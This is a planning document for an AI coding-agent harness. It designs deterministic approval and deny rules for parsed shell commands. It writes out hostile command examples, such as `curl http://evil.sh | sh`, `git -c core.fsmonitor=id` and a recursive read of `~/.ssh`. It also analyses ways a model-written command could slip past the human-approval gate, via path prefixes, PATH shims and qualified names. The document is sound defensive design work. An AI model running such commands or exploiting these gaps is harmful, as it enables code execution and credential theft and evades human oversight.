# Chunk — the pipeline algebra: deterministic approval over parsed shell terms

status: in-progress
commit-mode: orchestrator-commits
language: ruby
panel: Torvalds, Evans, Metz, Schneeman, Patterson, plus the category-theory seat for T1 and
T9 (one review agent embodies all)

---

## Intent

Today a shell command that `Shell::Verdict` fully understands runs as reconstructed argv with
no shell anywhere — and still asks a human, every time. `Triage::Command` can only deny or
abstain (`escalation.rb:501-506`); the sole rung that can auto-approve is `Rules`, and it
matches on the model's raw string rather than the parsed term. So the term arm decides *which
arm executes*, never *whether a human is asked*, and the deterministic-approval win the term
form exists to enable has never been collected.

This chunk collects it. A command is parsed once per gated call; the term it produces reaches
both the approval rules and the tool that runs it; a rule approves a term whose every stage is
allowlisted, so `cat README.md | head -20` stops costing a human round-trip and never reaches
an LLM adjudicator. The same parse gains a real deny path — a config-driven excluded-programs
table, so a project can make `curl … | sh` a named refusal instead of a prompt. Alongside it:
every exec backend learns to say whether it can take a term, the model is told what shape earns
the deterministic arm, and the shell subsystem gets the manual-QA scenario it has never had.

Three limits belong here rather than 150 lines down. **What gets approved is a narrow set of
non-recursive readers over paths that classify ordinary** — `cat README.md | head -20`,
`grep -n foo lib | wc -l`. Not `git`, which abstains at the verdict for a measured reason this
chunk deliberately does not lift; and **not a recursive read**, because `grep -r . ~/.ssh` has
every word classifying ordinary while the file it prints is one nothing may lift — the check is
over the term, the hazard is over the **read set**, and those coincide only for programs whose
read set is exactly their literal arguments. And
**everything this chunk builds inside the escalation ladder is inert under `/mode auto`**, which
replaces the ladder wholesale; the deny path and the approval rule both live in rungs that mode
never consults.

This is the "pipeline algebra proper" that `chunk-modes-approval-undo.md` deliberately deferred
("the monoid, the term `Tool::Input`, and plan-level approval are a separate feature chunk")
and that `Approval::Rule`'s own class comment names as its unmechanized half.

## Grounding

Verified 2026-08-26 against `12e5715c`, **which is now an ancestor of `main` at `c23774f1`
(merge `8179ca2c`) — so `main` is the correct base ref and carries every line this plan cites.**
Suite at the merge: **16,176 examples, 0 failures, 15 pendings**.

⚠️ **Do not base a worktree on `survey/dogfood-2026-08-25`.** Its content is identical, but its
working tree carries another session's uncommitted edits in ~16 files including
`planning/qa/README.md`, which **T10 modifies**. Confirm the base ref in the staleness check.
(An earlier draft of this paragraph said the reverse — that `main` was 22 commits behind and every
citation was wrong against it. That was true before the merge and is now inverted; it is recorded
because a stale base-ref warning points executors at exactly the wrong tree.) Everything below was read or measured, not
inferred; where a doc and the code disagreed, the code won and the doc is a card.

**`Shell::Pipeline` is on the live production path** — the opposite of what this chunk's
research first assumed. `Tools::Bash#perform` (`bash.rb:139-147`) → `Shell::Verdict#call` → on
`allow?`, `decision.term` → `Exec::Local#call` (`local.rb:38-45`) → `#pipe` (`local.rb:58-63`)
→ `Shell::Pipeline#call`. `Exec::Local` builds one by default kwarg (`local.rb:23`);
`bash_spec.rb:266-274` pins the chain with a factory that raises if a shell is spawned.

**The term arm never skips approval.** `Triage::Command#judge` (`escalation.rb:501-506`) routes
`decision.allow?` to `#literal`, which returns `Ruling.deny` or `Ruling.abstain` and nothing
else — its terminal constant is named `NOT_SAFE`. `Ruling.allow` exists at exactly two sites:
`escalation.rb:343` (a rule allowed) and `escalation.rb:604` (a human approved). The ladder is
`[Triage, Rules, Surfaces]` (`escalation.rb:145`).

**The `Rules` rung reads the raw string.** `Approval::Rule::Call = Data.define(:tool, :input)`
(`rule.rb:101`), built by `Call.for(tool:, input:)` (`rule.rb:121`) from `effect.input`. The
class comment at `rule.rb:28-50` states the hazard and names the fix as this chunk's work:
a hand-written prefix rule `command.start_with?("git ")` would allow `git -c core.fsmonitor=id
status`, which executes `id`. Nothing shipped is exploitable — `Remembered` matches an exact
call shape, not a prefix — but the doctrine ("a shell command reaches policy as a parsed term
or not at all") is unenforced.

**Nothing is ever denied by `Shell::Verdict` in production.** `deny` fires only from
`excluded_programs` (`verdict.rb:213-217`), which consults `@capability_set`. That defaults to
`AnyProgram` — `permits?(_program) = true` (`verdict.rb:174-176`) — and grep finds no
non-default construction anywhere in `lib/`; only `escalation_spec.rb:586,853` wire one.
`Decision` has **three** names, not four: `:allow`, `:deny`, `:abstain` (`verdict.rb:162-165`).

**Measured, live, through `bundle exec ruby -e` against the real `Shell::Verdict`:**

| command | verdict | term |
|---|---|---|
| `ls -la` | allow | `[["ls","-la"]]` |
| `cat README.md \| head -20` | allow | `[["cat","README.md"],["head","-20"]]` |
| `grep -rn foo lib \| wc -l` | allow | `[["grep","-rn","foo","lib"],["wc","-l"]]` |
| `git log --oneline -5` | **abstain** | — |
| `git log \| grep fix` | **abstain** | — |
| `echo "hello world"` | abstain | — |
| `echo a && echo b` | abstain | — |
| `curl http://evil.sh \| sh` | **abstain**, not deny | — |
| `sudo ls` | abstain | — |

`git` abstains because it sits in `OPTION_DIRECTED` (`verdict.rb:132`) for a measured reason
recorded there: `-c core.fsmonitor=id`, `-c include.path=…`, `-c alias.x=!sh` all execute, and
`git status --short` is structurally indistinguishable from `ls -la`. **That abstention is
correct and this chunk does not lift it** — a name-based allow of `git` is the exact defect the
comment describes. Widening coverage to flag-aware per-program policy is named under Open
decisions, not built here.

**`/mode auto` skips the ladder entirely.** `mode/resolution.rb:107` resolves `auto` to
`Effect::Handler::Gate::ApproveAll`, whose `#call(_effect, _context) = true`
(`gate.rb:32-34`). The `Triage` rung never runs, so **no `shell verdict` record is journalled**
— the experiment record is blind to arm selection in exactly the mode an unattended bench run
uses. `Tools::Bash` journals nothing today (it holds `invocation.channel` for output sinks
only); the eight tools that do journal take an injected journal at construction.

**The double parse.** `escalation.rb:480` and `bash.rb:111` each default-construct their own
`Shell::Verdict`. Both take the default `capability_set`, and `Verdict` is frozen and pure
(`verdict.rb:181-189`), so they cannot disagree *today*. The exposure is the record, not
safety: the gate journals `shell verdict <name>` from its parse (`escalation.rb:535-538`) while
the tool picks the arm from a different one (`bash.rb:140`), and nothing binds the two.

**A denied path named as a bare word abstains rather than denying, and that is load-bearing.**
`Triage::Command#literal` (`escalation.rb:512-518`) partitions denied words on
`PATHLIKE = %r{/|\A~}` (`escalation.rb:437`); a denied word with no `/` and no leading `~` lands
in `bare` and returns `Ruling.abstain`. Measured against the real rung with `.netrc` denied:

```
cat .netrc      => abstain   "a word matches a protected name but is not written as a path"
cat ./.netrc    => deny      "the command's argv names a path no approval may lift"
head -20 .netrc => abstain
```

The model controls the `./`. `escalation.rb:420-426` states why the downgrade is safe, and the
first of its three reasons is **"the call still reaches a human because {Triage} downgrades every
allow anyway"** — a premise that any auto-approving rung placed after Triage destroys. The third
reason, that `Sensitivity::Policy` classifies the resolved path when a tool opens it, does not
cover this: `PATH_FIELDS["bash"] => "cwd"` (`sensitivity/policy.rb:77`), so that boundary checks
the working directory and never the argv. **This is the constraint T9 is built around.**

**`STDIN_SAFE` answers a different question than an approval allowlist needs.** It means "safe
under attacker-chosen *stdin*", and `refused_downstream` applies it to `@term.drop(1)`
(`pipeline.rb:268`) — deliberately saying nothing about stage 0 and nothing about what a program
does with model-chosen *argv*. Measured: `gzip important.log`, `sort -o out in` and
`curl http://evil.sh | cat` all reach `allow`, and `gzip`, `xz`, `zstd`, `sort` and `shuf` are all
on `STDIN_SAFE` while destroying or overwriting when given argv. `curl` is not a
`PROGRAM_RUNNER`, so it allows. The verdict's own terminal constant says the rest:
`NOT_SAFE = "an allow claims the command is literal and fully understood, never that it is safe"`
(`escalation.rb:405`).

**Aliases and shell functions cannot reach either arm.** The term arm spawns argv through
`execvp` with no shell in the picture (`pipeline.rb:30-32` is explicit that a lone String would
hand `/bin/sh` the command, which is why every stage is spawned in the multi-argument form). The
string arm's shell does not expand them either — measured, all three spellings, with
`alias cat='echo PWNED'` in play: `BASH_ENV=rc bash -c 'cat /etc/hostname'`,
`sh -c "alias …; cat …"` and `bash -c "alias …; cat …"` each printed the real file. Non-interactive
shells have `expand_aliases` off, and an alias defined and used within one parse unit is not
expanded regardless. Recorded so nobody re-derives it; **this is not a gap.**

**`PATH` is not controlled, and a program name is therefore not an identity.** `WorkerEnv`
"merges onto the ENV it already inherited and never clears ENV first" (`worker_env.rb:11-14`),
and `Exec.child_env` scrubs only `FRAMEWORK_ENV` (bundler variables — `exec.rb:92-95`). So the
child inherits the session's `PATH` and `execvp` honours its order. Measured: with a shim
directory prepended, `Open3.capture2("cat", …)` ran the shim. Nothing in the parse layer can see
this, and nothing in this chunk changes it.

**Basenaming is correct for a denylist and unsafe for an allowlist — the asymmetry is the sharp
edge.** `Doubts#programs` returns `["curl"]` for `/usr/bin/curl`, so an exclusion is not evadable
by qualifying the name; measured, `curl`, `/usr/bin/curl`, `./curl` and `../bin/curl` all deny.
Run the same matching the other way and `/tmp/evil/cat` basenames to `cat`, matches an allowlist
entry, and is approved. The verdict allows every qualification — `/tmp/evil/cat f`, `./cat f`,
`bin/cat f` all reach `allow` with the written word as argv0. **T9 must not reuse this
matching**, and the rule that keeps the two straight is stated on that card.

**Under `/mode auto` the ladder is never consulted at all**, so the config deny path (T4/T6) and
the approval rule (T9) are both inert there. And a session with no queue gets a one-rung
`Unattended` deny-all ladder instead (`switchboard.rb:265,385-396`). Three postures decide
differently — attended ladder, `auto` approve-all, unattended deny-all — and every card that
records or decides has to say which it means. Note `effect/handler/sensitivity.rb:8-9` is the
opposite of what an earlier draft claimed: a denied path is **not** approvable, and no policy,
no `/mode auto` and no `ApproveAll` lifts it, because that handler sits ahead of the Gate.

**`Sensitivity::Rules.unbounded?` refuses a wildcard only on the granting key**
(`sensitivity.rb:297-301`): `exempt` subtracts, so `exempt = ["*"]` is refused, while the same
pattern under `denied` or `gated` "can only ever add, so they stay legal". An exclusion table
only restricts, so by that precedent `exclude = ["*"]` must be **honoured**, not refused.

**Exec backends.** `lib/lain/exec.rb:13-19` states one contract —
`#call(command:, cwd:, env:, timeout:, stdout_sink:, stderr_sink:)`, `command` a String or a
term — with **no base class; three duck-typed classes**. The comment at `exec.rb:22-36` names
the missing `#takes_term?` predicate ("THIS IS NOT A CALLER'S BUG… What catches it is a blanket
`rescue StandardError` in `Effect::Handler::Live`, not a design") and confirms it does not
exist. `Exec::Docker` **already runs single-stage terms** (`docker.rb:152`, pinned at
`docker_spec.rb:533-537`) and refuses piped ones at `docker.rb:158-161`. `Exec::Core` refuses
every term at `core.rb:75-79`.

**The daemon protocol already carries argv.** `Exec::Core#params` (`core.rb:81-87`) sends
`"argv" => ["sh","-c",command]`; the Rust side is `ExecParams { argv: Vec<String>, … }`
(`crates/lain-core/src/exec.rs:30`) and `spawn` does `Command::new(program).args(args)`
(`exec.rs:186-190`) with **no shell anywhere in the crate**. `rpc.rs:728` already exercises a
bare `["true"]`. So a single-stage term needs no protocol change — only a different choice in
Ruby. A *piped* term genuinely has no wire shape: one `tokio::process::Command` per request, no
piping machinery in the crate.

**`Exec::Core`'s refusal is unreachable, and so is the tool that would reach it.**
`Tools::CoreExec` shares `Bash::Input` by identity (`core_exec.rb:40`) but holds no `Verdict` and
always passes a String (`core_exec.rb:94-97`). More decisively, **nothing in `lib/` ever
constructs `Tools::CoreExec`** — the only construction in the tree is
`spec/support/tool_registry.rb:57`, and `BaseTools.build` does not include it.
`exec_backend.rb:42-47` says "a bench constructs `Tools::CoreExec` explicitly instead"; no such
bench exists here. Docker's refusal *is* reachable, via `Tools::Bash` plus an allowed pipeline —
stated outright at `docker_spec.rb:553-565`.

**The wiring topology, which decides where a shared object can be built.** The real file is
`lib/lain/cli/wiring/base_tools.rb` (there is no `lib/lain/cli/base_tools.rb`, and no mirrored
spec for it at any path). `wiring.rb:302` builds `ToolsetBuild`; `toolset_build.rb:234` calls
`BaseTools.build(recorder, exec:)` which constructs `Tools::Bash`; only then does
`wiring.rb:355` build the switchboard **from** the finished toolset, and `board_build.rb:47-54`
is where the project root lives and where the analogous `Config.sensitivity` read already
happens. So the toolset is complete before the ladder exists, and anything both must share has
to be built at or above `wiring.rb` and threaded down through `toolset_build.rb` and
`board_build.rb`. `spec/lain/approval/rule_spec.rb` does not exist either — `Rule` is exercised
through `rule_chain_spec.rb`, `remembered_spec.rb` and `risk_spec.rb`.

**Nothing model-facing constrains shell syntax anywhere.** No prompt template, role file, slot
or tool description mentions a dialect. `Prompt::Slots::KNOWN` is `%w[system]` (`slots.rb:24`)
— one top-level slot, whose override *augments*. Tool descriptions are not overridable and are
explicitly out of scope per `planning/specs/prompt-slots.md:52`. `Bash#description`
(`bash.rb:119-123`) and `CoreExec#description` (`core_exec.rb:63-67`) are two separate static
strings, **both promising `sh -c`**, which the allow arm never uses. `field :command`'s
description (`bash.rb:64`) says the same and is shared by both arms via the shared Input.
`Tool#one_line_description` (`tool.rb:76-78`) is `description.to_s.lines.first.to_s.strip` and is
the single source both halves of deferred disclosure use (`disclosure/deferred.rb:26`,
`tool_search.rb:78,85`). **It splits on newlines, not on sentences, and no tool in
`BaseTools.build` has a newline in its description** — measured: for both `bash` and `grep`,
`one_line_description == description`. So nothing is truncated today and there is no placement
constraint. Recorded because an earlier draft of this plan asserted the opposite and built a
card around it. The precedent for a syntax-constraining description is `grep`
(`grep.rb:17-21,57,195-205`), whose rationale is the same two-arm-parity argument.

**QA.** `planning/qa/scenarios/` holds **16** files; `README.md:109` says fifteen and the
manual-qa skill says fourteen — both stale. No scenario mentions `Shell::Verdict`, `Parse`,
`Pipeline`, the term arm or arm selection; the whole `lib/lain/shell/` subsystem has zero
manual-QA coverage and is absent from `README.md`'s Known Gaps. The five scenarios that touch
`bash` use it as a vehicle (output bound, approval gate, toolchain-agnosticism). Precedent for
a scenario owning an unscheduled feature: `survey.md` (`README.md:59-61`). The standing tier
rule is "anything deterministic belongs in the cheap set even when the feature it guards is
expensive" (`README.md:97,179`).

**Config.** `[approval]` is `Config::Answers` — remembered answers, not a denylist. The
denylist precedent is `Sensitivity::Rules` (`sensitivity.rb:173-201`): keyed table, per-key
verdicts carrying their own reason, `UNBOUNDED` patterns refused, read by `Config.sensitivity`
(`config.rb:115-120`) separately from `.load` because the two have opposite postures about a
typo.

**`spec/lain/shell/pipeline_spec.rb` spawns real subprocesses but carries no `:seam` tag** — a
discrepancy from CLAUDE.md's stated convention. Noted, not resolved here.

### Research inputs, and what they settled

`planning/tool-use-algebra.md` §6 is **wrong in three ways** and T1 corrects it. The dialect
question ("do we lose functionality asking for oil?") was researched and answered **yes, do not
mandate YSH**: 225 `.ysh` files on GitHub against 26.4M `.sh`; no Linguist entry, so `go-enry`
in The Stack v2 pipeline drops or mislabels them; no Stack Overflow tag. The nearest measured
analogue is a ~20-point drop (GPT-4o 84% bash vs 64% PowerShell, at comparable Stack Overflow
volume). Instruction adherence for a syntax constraint stated in a function-parameter
description tops out near two-thirds (IFEval-FC: Claude Opus 4.1 68%, GPT-4.1 14%), and the
failure mode is *silent bash*. Oils exposes no AST API (their issue #1382, open since 2022).
YSH's one real static-approval property — `simple_word_eval` making `$x`/`$(…)` evaluate to
exactly one argument, so argv arity stops being data-dependent — does not outweigh the corpus
cost. Consequence for this chunk: **T2 steers toward the parsable bash subset, not a dialect.**

## Orchestrator contract (plan-specific only)

- Shared files (orchestrator-owned, wiring diffs only):
  `lib/lain.rb`, `lain.gemspec`, `.rubocop.yml`, `spec/spec_helper.rb`, and the three unit
  indexes this chunk adds a file under — `lib/lain/shell.rb`, `lib/lain/telemetry.rb`,
  `lib/lain/approval.rb`. Each is a one-line `require_relative` handed back by exactly one card.
  `chunk-modes-approval-undo.md` recorded that unit index files it left with their cards
  collided at merge when two same-wave cards both added under one namespace; this plan takes the
  lesson for indexes.
- **Not** orchestrator-owned, deliberately: `lib/lain/exec.rb`, `lib/lain/cli/wiring/base_tools.rb`,
  `lib/lain/cli/switchboard.rb`, `lib/lain/cli/wiring/board_build.rb`, `lib/lain/cli/wiring.rb`.
  These are a contract document and four construction sites, not manifests, and each is edited by
  at most one card per wave (`exec.rb` by T3 only; `wiring.rb`, `board_build.rb`, `switchboard.rb`
  and `base_tools.rb` by T6 in wave 2, then `base_tools.rb` again by T7 in wave 3 and
  `board_build.rb` again by T9). Making them wiring-only would put each owning card's ACs out of
  reach of the card that must turn them green.
  **Note the real path is `lib/lain/cli/wiring/base_tools.rb`** — there is no
  `lib/lain/cli/base_tools.rb`, and it has no mirrored spec today.
- Deviations from the default process: none. The two docs-only cards (T1, T13) still get a
  panel pass — T1 because the claim it corrects is an algebraic one and the CT seat is the
  reader who can check it, T13 because a QA scenario asserting the wrong string is worse than
  no scenario.

## Defense in depth — which rung this chunk stands on

**The governing principle, and it outranks any individual limit recorded below.** Every safety
property here is one rung on a ladder, never a finished answer. A limit stated in this plan is a
statement of **where the implementation currently stands**, and never a justification for staying
there — "a human would have been fooled too" describes today's parity, it does not argue that
parity is the goal. The whole reason to have a deterministic approver is that, unlike a human, it
can be made strictly stronger over time.

So: **every chunk touching this subsystem states its position on each axis below, and names the
next rung.** A chunk that silently leaves an axis unmentioned is claiming nothing changed there,
and a reader is entitled to hold it to that. Cards must be built so the next rung bolts on as one
more predicate rather than a restructuring — T9 carries that requirement explicitly.

| axis | rung after this chunk | next rung |
|---|---|---|
| **What reaches a shell** | Understood commands run as reconstructed argv through `execvp`; everything else through `sh -c`. Coverage measured, not assumed. | Flag-aware per-program policy, so `git log` earns the term arm without allowlisting the name |
| **Who decides** | A deterministic rule approves, with no human and no LLM, a term whose every word classifies **ordinary** and whose programs read **exactly their literal arguments**; a config table denies by name. | Widen what qualifies as flag-awareness lands; project-expressible term policy |
| **What a command may read** | Bounded by the two predicates above, not by the term alone. Recursive readers are refused outright because their read set is not their argv — `grep -r . ~/.ssh` has every word ordinary and prints a file nothing may lift. Gated paths (`.env`, `*.pem`, `.git-credentials`) are refused, not merely un-denied. | Per-entry flag policy rich enough to re-admit bounded recursion; a read-set predicate that survives a program's own config files |
| **Program identity** | **Trusted by name.** `PATH` is inherited and uncontrolled; `execvp` resolves argv0 against it. Qualified names (`/tmp/evil/cat`) are refused, so **on this axis alone** it is no weaker than a human reading the string — that parity is a claim about program identity and not about the composite. | Resolve and record the absolute path — cheap, changes no decision, prerequisite for everything above it |
| **Content the command pulls in** | `web_fetch` refuses non-routable destinations — cloud metadata, loopback, RFC1918 — unconditionally and on every redirect hop (**T11**). The check is lexical on the host. `curl X \| sh` still abstains to a human who has seen only a URL. | Refuse by **resolved** address, so a public name pointing into a blocked range is caught (needs connect-to-resolved-IP or DNS rebinding reopens it); then fetch-once / content-address / approve the digest / run those exact bytes |
| **Where it runs** | Local process with an inherited environment, or a container under `--exec docker`, which stops erroring on ordinary pipelines. **Note what that fix is**: T3 falls back to the model's string, which `Docker#entrypoint` (`docker.rb:151`) runs as `["sh","-c",command]` *inside* the container — contained, but the term arm's no-shell property is gone on that path. | Piped terms that stay terms inside a container, which needs a design rather than a card |
| **What the record proves** | Which arm ran, in both attended and `auto` mode. | Which binary actually ran (rung 1 of program identity) |

Three of these are worth stating flatly rather than as table cells, because a reader skimming
should not have to infer them. **This chunk does not make the shell safe; it makes a narrow,
measured subset of it decidable without a human.** **A program name is not an identity** — the
allowlist says `cat` is a safe *program*, and whether the thing `execvp` finds is that program is
a question no rung here asks. And **a term is not a read set** — the rule inspects the words the
model wrote, while the exposure is the files the program opens, and this chunk closes the gap only
by refusing every program whose read set can exceed its arguments. Both blockers the second review
pass found lived in that gap, which is why the axis is in the table at all: an earlier draft had
six axes and none of them was the one this chunk moves furthest.

**A recurring defect shape, named here because this chunk is the third instance.** Three separate
safety mechanisms in this codebase exist, are specced, and have never been wired: `Triage`'s
`AnyPath` classifier (found in QA round 10 — "lain's protected-path argv check already exists and
has never run"), `Shell::Verdict`'s `capability_set` (this chunk, T4/T6), and `Tools::WebFetch`'s
host allowlist (`base_tools.rb:24` constructs it with no argument, and nil means no restriction —
**T11**). A Null Object default is what makes a collaborator injectable, and it is also
what lets an unwired guard ship green forever. **Any card here that adds a seam with a permissive
default owes an acceptance criterion driving the production construction path**, which is why
every capability in this plan names one.

## Open decisions

None of these gate a card. Each is recorded so a later chunk starts from the grounding above
rather than re-deriving it.

- **Flag-aware per-program policy, so `git log` can earn the term arm.** The single highest-value
  follow-on. `git` abstains today for a measured reason and a name-based allow is unsafe; the
  fix is a policy over `(program, flag-shape)` — the same discipline `pipeline.rb:95-104` already
  states ("membership requires having READ the program's flags, not having recognised its
  name", after `rg --pre=id` was measured executing `id`). Until it exists, the deterministic
  approval this chunk builds covers coreutils-shaped pipelines and not `git`. **This is worth
  saying plainly: the motivating example `git log | grep blah` still asks a human when this
  chunk lands.** What lands is the machinery that makes the flag-aware card small.
- **Piped terms under `--exec docker`.** Deliberately out of scope, with the reason: a container
  takes one argv and `docker run` has no multi-stage pipe primitive, so support means either
  `sh -c` inside the container (defeating the point, and `docker.rb:154-156` refuses to join a
  term back into a string) or baking a pipe-capable helper into the image. T3 makes the refusal
  a predicate the caller can ask instead of an exception it must rescue; it does not remove it.
- **Replacing `Shell::Parse`'s tree-sitter backend.** Researched and deferred by decision.
  `brush-parser` (pure Rust, PEG, serde AST, MIT, pushed within the week) fits the placement
  rule in `docs/rust-bindings.md` exactly — pure, synchronous, owns no terminal — and
  `shfmt --to-json` is the zero-risk fallback. Running two parsers and gating on agreement would
  make the tree-sitter-#315 class of silent misparse observable. Its own chunk.
- **`PATH` trust — where this starts, and the ladder it is meant to climb.** The term arm resolves
  argv0 through `execvp` against an inherited, uncontrolled `PATH` (Grounding). This chunk starts
  by trusting it, because auto-approval is then no weaker than the human approval it replaces.
  **That is a starting rung and explicitly not a settled position** — the rungs below are ordered
  by cost, each is independently shippable, and T9 is required to be shaped so each bolts on as
  one more predicate:

  1. **Resolve and record.** Resolve argv0 through the child's own `PATH` at approval time and
     journal the absolute path that would run, alongside the arm T7 already records. Changes no
     decision, costs almost nothing, and is the prerequisite for every rung above it — you cannot
     constrain what you have never measured. It also turns "what actually ran" into a question the
     experiment record can answer, which today it cannot. **The cheapest real improvement, and the
     obvious next card.**
  2. **Resolve and constrain.** Require the resolved path to sit under a set of trusted prefixes
     (`/usr/bin`, `/bin`, …), refusing a shim in any user-writable directory. Leaves a TOCTOU
     window between the check and `execvp` but narrows the exposure enormously. Needs rung 1's
     measurements first, to know which prefixes real sessions actually use.
  3. **Resolve and verify identity.** Compare the resolved binary against a recorded digest or
     inode. Strongest, and the only rung that closes rung 2's TOCTOU window; also the only one
     with ongoing maintenance cost as packages update.
  4. **Control `PATH` for the term arm.** Pin a known `PATH` rather than inheriting one. Breaks
     toolchains — this repo's own `mise` shims live on `PATH` — so it needs a real design and is
     listed last for that reason, not because it is least effective.

  Nothing here is blocked on anything in this chunk beyond T9 existing. Rung 1 could reasonably be
  folded into T7 if the orchestrator wants it sooner; it is left out only to keep T7's scope to one
  responsibility.
- **Shell builtins versus binaries on the term arm.** `echo hello` runs `/usr/bin/echo`, not a
  shell builtin, so a term-arm run and a string-arm run of the same command can differ in edge
  behaviour. `chunk-modes-approval-undo.md` T17 recorded the invariant that both arms produce the
  same output for the same accepted command; builtins are where that invariant is thinnest. Not
  known to bite today, and no card here changes it.
- **Should the shipped default exclusion set be non-empty?** T4/T8 build the seam and default it
  to empty, so no existing behaviour changes. Shipping a default denylist (interpreters,
  privilege escalators) is a stronger posture but would refuse work people do today. Left to a
  measured decision after the bench can compare postures.
- **A `shell` prompt slot.** `Slots::KNOWN` is `%w[system]`; adding a second name is a two-line
  change plus a template hole, and `planning/specs/prompt-slots.md:47-50` already sketched that
  shape for a `compaction` slot that was never built. T2 puts the guidance in the tool
  description instead, because that is the only channel reaching every consumer of `bash`
  including the top-level agent — a role tail reaches only the five bash-holding roles and never
  the main chat agent. If per-project override of the guidance is later wanted, that is when the
  slot earns its place.
- **Single-stage terms through the lain-core daemon.** Cut from this chunk after review, not
  deferred for cost. The wire needs no change — `ExecParams { argv: Vec<String> }`
  (`crates/lain-core/src/exec.rs:30`) already takes bare argv, `spawn` does
  `Command::new(program).args(args)`, and every `sh -c` in the crate is inside `#[cfg(test)]`.
  The blocker is reachability: **nothing in `lib/` constructs `Tools::CoreExec`** — the only
  construction in the tree is `spec/support/tool_registry.rb:57`, and `BaseTools.build` does not
  include it. `exec_backend.rb:42-47` says "a bench constructs `Tools::CoreExec` explicitly
  instead"; no such bench exists. Building the term path for it would ship a capability nothing
  runs. Whoever ships that bench should carry this card with it.
- **Piped terms through the daemon** need a genuinely new param shape plus daemon-side piping
  mirroring `Shell::Pipeline::Run` — one `tokio::process::Command` per request today, and no
  piping machinery in the crate. A Rust card, needing the Rust panel.
- **`pipeline_spec.rb` is untagged despite driving real subprocesses.** A convention question
  for the suite, not this chunk.

## Waves

```
Wave 1: T1, T3, T4, T5, T11     (no unmet deps)
Wave 2: T2, T6 (<-T4)
Wave 3: T7 (<-T5,T6)
Wave 4: T8 (<-T6,T7)
Wave 5: T9 (<-T6,T8)
Wave 6: T10 (<-T2,T7,T9,T11)
```

Critical path: **T4 → T6 → T7 → T8 → T9 → T10** (six waves). T11 depends on nothing and could land
anywhere; it sits in wave 1 because it is the only card closing a **presently exploitable** gap
rather than building a capability.

T6 is the spine. It builds one frozen `Shell::Verdict` from config and injects it at both seams
that construct one today, which is simultaneously the config wiring, the end of the double
parse, and the supply of an authoritative decision to everything downstream. An earlier draft
split those into two cards and threaded a decision value from the ladder to the tool; the review
panel showed the threading channel does not exist without widening every tool's invocation
context, and that injecting one pure frozen object gets all three properties by construction
instead. `Verdict` is frozen and pure (`verdict.rb:181-189`), so two sites holding the same
instance compute the identical `Decision` from the identical String — no value needs carrying,
so none can be forged.

T2 sits in wave 2 only to keep it off `lib/lain/tools/bash.rb` while T3 is editing that file; it
blocks nothing but T10.

No two same-wave cards modify the same file. Wave 1: T1 (a planning doc), T3 (`exec/*` and
`bash.rb`), T4 (`shell/exclusions.rb`, `config.rb`), T5 (`telemetry/`), T11
(`tools/web_fetch.rb`). Wave 2: T2 (`bash.rb`, `core_exec.rb`), T6 (`cli/wiring/*` and
`switchboard.rb`). Waves 3–6 hold one card each, so collision is not a question there — T8 sits
in its own wave rather than beside T7 precisely because both must edit `bash.rb`.

## Tasks

### T1 — Correct the pipeline algebra in the tool-use algebra doc [wave 1] [risk: low]

**Depends on:** none
**Files:** modify `planning/tool-use-algebra.md` (§6, lines ~200-250)
**Reuse:** `lib/lain/shell/pipeline.rb:95-115` (the `STDIN_SAFE` comment and list),
`pipeline.rb:267-273` (`refused_downstream`), `lib/lain/shell/verdict.rb:124-135`
(`OPTION_DIRECTED` and `PROGRAM_RUNNERS`)
**Shared-file wiring:** none
**Reachable from:** documentation only — this card changes no code. It is in scope because §6
is the doc a future chunk would plan the algebra from, and it currently specifies a design that
is unsafe and that the code deliberately does not implement.

§6 makes three claims the implementation contradicts, and the implementation is right:

1. *"pipeline membership needs a stronger per-tool predicate, 'safe under arbitrary stdin',
   declared per tool like `parallel_safe?` is"* — pipeline stages are arbitrary **programs**
   (`jq`, `wc`, `head`), not lain `Tool` objects. There is no `Tool` for `jq` to declare
   anything on. The implementation is necessarily a program-name allowlist held by `Pipeline`.
2. *"A term is authorized iff the Toolset holds every component, so `only(:grep, :rspec)`
   already bounds the expressible pipelines, and attenuation needs no new mechanism"* — false.
   The Toolset holds `bash`; `only(:grep)` attenuates lain's `grep` **tool**, an unrelated
   object from the `grep` binary in a pipe stage. Capability attenuation does not compose here
   and the sentence should be struck, not softened.
3. *"those tools form a **submonoid**: closed under pipe, so safety is inductive over terms and
   a compound never needs its own review"* — the induction is invalid. `xargs` promotes stdin
   into argv (`printf 'foo\n-rf /tmp/xx\n' | xargs echo` yields `foo -rf /tmp/xx`), so a stage
   that is tier-2 safe alone is not safe downstream. This repo found the same lesson
   independently and the harder way, recorded at `pipeline.rb:98-100`: `rg` sat in `STDIN_SAFE`
   until `echo hi | rg --pre=id foo` was measured executing `id`.

The rewrite states what the code does — an enumerated, hand-maintained, deliberately incomplete
allowlist of 46 program names, erring toward a refusal — and why a derived predicate cannot
replace it. Keep the parts that are correct and load-bearing: processes under pipe compose
associatively with `cat` as identity; the tier axis surviving because a term is data and no
string reaches `sh -c`; the journal-ability of a term. `Open3.pipeline` in the Cost paragraph is
accurate enough (`Pipeline` uses `Open3.pipeline_r`, `pipeline.rb:334`) and needs no change.

Then add one short subsection recording the **layered-defense principle** this chunk adopted, so
it outlives the plan: every safety property in this area is a rung, a stated limit describes where
the implementation stands rather than where it should stop, and a chunk touching this area names
its position on each axis and the next rung. `tool-use-algebra.md` is the right home because it is
the doc a future chunk plans this subsystem from — the plan's own **Defense in depth** table is
the worked example to point at, not to copy.

Per CLAUDE.md this doc is prose, not `lib/` or `spec/`, so the ticket-reference ban does not
reach it; leave existing references alone rather than widening the diff.

**Acceptance criteria** — docs-only, verified by reading rather than by a spec:

```gherkin
Scenario: the doc no longer specifies a per-tool stdin-safety declaration
  Given planning/tool-use-algebra.md section 6
  When a reader looks for how pipeline membership is decided
  Then it describes an enumerated program-name allowlist held by Shell::Pipeline
  And it cites pipeline.rb's own rg --pre=id measurement as the reason a name cannot earn membership
  And the words "submonoid" and "inductive" no longer assert that a compound needs no review

Scenario: the Toolset-attenuation claim is gone
  Given the same section
  When a reader looks for how a term is authorized
  Then it does not claim that only(:grep) bounds the programs a pipeline stage may name

Scenario: the layered-defense principle is recorded where the next chunk will read it
  Given planning/tool-use-algebra.md
  Then it states that a stated safety limit describes the current rung, not a stopping point
  And it asks a chunk touching this area to name its position on each axis and the next rung
```
→ no spec file; this card's evidence is the diff, and the reviewer checks it against the three
cited code sites.

**Escalation triggers:**
- If §6 turns out to be cited by another planning doc that would be made wrong by the
  correction — grep `planning/` for `submonoid` and for `tool-use-algebra.md:` before editing —
  stop and report which docs need the same fix, rather than silently leaving them contradictory.
- If any code in `lib/` actually does declare a per-tool stdin-safety predicate (grep for
